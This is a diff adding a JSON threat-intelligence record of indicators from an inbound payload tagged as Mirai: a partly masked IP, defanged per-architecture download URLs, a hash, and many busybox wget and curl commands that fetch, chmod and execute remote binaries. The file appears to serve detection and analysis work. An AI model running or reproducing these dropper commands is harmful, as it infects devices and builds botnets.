@@ -1,0 +1,230 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "94.154.43.XXX"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm7;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.m68k;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mips;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.sh4;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.spc;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86;"
+  },
+  {
+    "context": "Inbound payload hash (mirai)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "67ea9188f82ea69ff63241d76861b96038a8f6a558a2c6ac3673c611aa81a2af"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRii"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaRR"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaRR"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; ./MMaaRR"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; ./MMaaRR"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; ./MMaaRR"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; ./MMaaRR"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./MMaaRRii"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./MMaaRRii"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./MMaaRRii"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_64; ./MM"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRii"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRiiOisecTan"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaRRiiOisecT"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaRRiiOisecT"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; ./MMaaRRiiOisecT"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; ./MMaaRRiiOisecT"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; ./MMaaRRiiOisecT"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; ./MMaaRRiiOisecT"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./MMaaRRiiOisecTan"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./MMaaRRiiOisecTan"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./MMaaRRiiOisecTan"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_64; ./MMaaRRiiOi"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRiiOisecTan"
+  }
+]
